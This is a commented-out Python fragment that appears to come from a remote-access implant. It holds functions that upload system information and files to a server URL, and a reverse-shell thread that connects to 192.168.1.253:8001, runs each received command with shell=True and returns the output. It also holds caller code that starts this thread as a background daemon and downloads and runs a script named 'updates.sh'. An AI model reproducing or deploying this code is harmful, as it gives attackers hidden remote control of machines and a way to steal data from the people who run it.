
# def upload_json_using_requests(dictionary, fname):
#     # Upload system info as JSON to the server

#     try:
#         response = requests.post(f"{SERVER_URL}/{fname}", json=dictionary)
#         if response.status_code == 200:
#             print("Json uploaded successfully.")
#         else:
#             print(f"Failed to upload json: {response.status_code}")
#     except Exception as e:
#         print(f"Error uploading system info: {e}") 
        
# def upload_file_using_requests(fname):
#     try:
#         response = requests.post(f"{SERVER_URL}/{fname}")
#         if response.status_code == 200:
#             print("File Successfully Uploaded.")
#         else:
#             print(f"Failed to upload: {response.status_code}")
#     except Exception as e:
#         print(f"Error uploading system info: {e}")
        


# def client_thread(server_host='192.168.1.253', server_port=8001):
#     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client:
#         try:
#             client.connect((server_host, server_port))
#             client.send(b'Session established with Client\n')
#             while True:
#                 command_requested = client.recv(1024).decode()
#                 prochandle = subprocess.Popen(command_requested,
#                                               shell=True,
#                                               stdout=subprocess.PIPE,
#                                               stderr=subprocess.PIPE,
#                                               stdin=subprocess.PIPE)
#                 results, errors = prochandle.communicate()
#                 results += errors
#                 client.send(results)
#             client.close()
#         except socket.error as e:
#             print(f"failed to connect: {e}")

# def start_client_as_thread(server_host='192.168.1.253', server_port=8001):
#     thread = threading.Thread(target=client_thread, args=(server_host, server_port), daemon=True)
#     thread.start()
#     return thread


    
    
    # try:
    #     command_thread = start_client_as_thread()
    # except Exception as e:
    #     print(f"TCP Dump Failed: {e}")
        
    # fname="test.txt"
    # try:
    #    download_using_curl(fname, storage_directory)
    # except Exception as e:
    #    print(f"Download failed {fname}: {e}")
    
    # fname = "updates.sh"
    # try:
    #    download_and_run_subprocess(fname, storage_directory)
    # except Exception as e:
    #    print(f"Error in Downloading and Running {fname}: {e}") 
    